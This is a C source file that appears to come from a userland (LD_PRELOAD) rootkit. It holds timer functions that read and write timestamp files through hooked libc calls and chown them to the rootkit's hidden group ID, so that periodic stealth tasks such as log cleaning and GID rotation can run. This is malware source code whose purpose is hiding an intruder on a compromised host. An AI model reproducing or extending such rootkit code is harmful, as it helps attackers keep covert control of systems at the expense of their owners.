/*
    the functions in this file are responsible for reading our '*TIME_PATH' paths.
    & behaving appropriately.. at the moment these are only 'CLEANEDTIME_PATH' & 'GIDTIME_PATH'.
*/

time_t getlasttime(const char *timepath){
    if(rknomore()) return time(NULL);

    time_t currentlast;
    FILE *fp;
    char timbuf[64];

    hook(CFOPEN);
    fp = call(CFOPEN, timepath, "r");
    if(fp == NULL && errno == ENOENT){
        time_t curtime = time(NULL);
        writenewtime(timepath, curtime);
        return curtime;
    }else if(fp == NULL) return -1;
    fgets(timbuf, sizeof(timbuf), fp);
    fclose(fp);

    chown_path(timepath, readgid());
    currentlast = (time_t)atoi(timbuf);
    return currentlast;
}

int writenewtime(const char *timepath, time_t curtime){
    if(rknomore()) return -1;

    FILE *fp;
    char timbuf[128];
    memset(timbuf, 0, sizeof(timbuf));

    hook(CFOPEN, CFWRITE);
    fp = call(CFOPEN, timepath, "w");
    if(fp == NULL) return -1;
    snprintf(timbuf, sizeof(timbuf)-1, "%ld", curtime);
    call(CFWRITE, timbuf, 1, strlen(timbuf), fp);
    fclose(fp);

    chown_path(timepath, readgid());
    return 1;
}

time_t timediff(const char *timepath, time_t curtime){
    time_t lasttime = getlasttime(timepath),
           diff = curtime - lasttime;
    return diff;
}

int itistime(const char *timepath, time_t curtime, time_t timer){
    if(notuser(0) || rknomore())
        return 0;

    // it is time...time....time......!
    if(timediff(timepath, curtime) >= timer)
        return 1;

    return 0;
}